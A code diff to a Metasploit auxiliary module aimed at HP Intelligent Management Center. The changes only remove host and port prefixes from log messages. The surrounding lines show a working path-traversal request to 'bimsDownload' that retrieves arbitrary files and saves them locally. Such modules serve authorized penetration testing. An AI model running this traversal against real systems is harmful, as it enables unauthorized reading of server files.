@@ -69,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     if not is_imc?
-      vprint_error("#{rhost}:#{rport} - This isn't a HP Intelligent Management Center")
+      vprint_error("This isn't a HP Intelligent Management Center")
       return
     end
 
@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     travs << "../" * datastore['DEPTH']
     travs << datastore['FILEPATH']
 
-    vprint_status("#{rhost}:#{rport} - Sending request...")
+    vprint_status("Sending request...")
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path.to_s, "bimsDownload"),
       'method' => 'GET',
@@ -98,9 +98,9 @@ class MetasploitModule < Msf::Auxiliary
         contents,
         fname
       )
-      print_good("#{rhost}:#{rport} - File saved in: #{path}")
+      print_good("File saved in: #{path}")
     else
-      vprint_error("#{rhost}:#{rport} - Failed to retrieve file")
+      vprint_error("Failed to retrieve file")
       return
     end
   end
